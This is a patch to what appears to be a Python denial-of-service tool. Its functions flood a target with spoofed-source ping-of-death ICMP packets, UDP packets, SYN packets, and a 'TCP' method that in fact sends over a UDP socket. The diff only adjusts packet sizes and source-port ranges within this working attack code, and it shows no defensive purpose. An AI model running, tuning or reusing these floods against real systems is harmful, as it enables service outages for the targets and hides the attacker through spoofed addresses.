@@ -107,7 +107,7 @@ def pod(target, port, timer): #Method POD
 
                 rand_addr = spoofer()
                 ip_hdr = IP(src=rand_addr, dst=target)
-                packet = ip_hdr / icmp() / ("m" * 65535)
+                packet = ip_hdr / icmp() / ("m" * 65500)
                 send(packet)
             else:
                 break
@@ -153,7 +153,7 @@ def udp(target, port, timer): #Method UDP
         #sys.stdout.write("["++f"] Attack Started To: {target}:{port} Time: {time} Method: UDP\r") 
     standard_time = time.time()
         
-    packet_size = random._urandom(int(Intn(65500, 65535))) 
+    packet_size = random._urandom(int(Intn(65499, 65500))) 
     while True: 
         end = time.time()
                     
@@ -178,7 +178,7 @@ def tcp(target, port, timer): #Method TCP
             
         if(end - standard_time < int(timer)):
 
-            data = random._urandom(int(Intn(65500, 65535)))
+            data = random._urandom(int(Intn(65499, 65500)))
             address = (str(target), int(port))
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             try:
@@ -208,7 +208,7 @@ def syn(target, port, timer): #Method SYN
                 IP_Packet.dst = target
 
                 TCP_Packet = TCP ()
-                TCP_Packet.sport = random.randint(65500, 65535)
+                TCP_Packet.sport = random.randint(65499, 65500)
                 TCP_Packet.dport = int(port)
                 TCP_Packet.flags = "S"
                 TCP_Packet.seq = random.randint(8000, 9000)
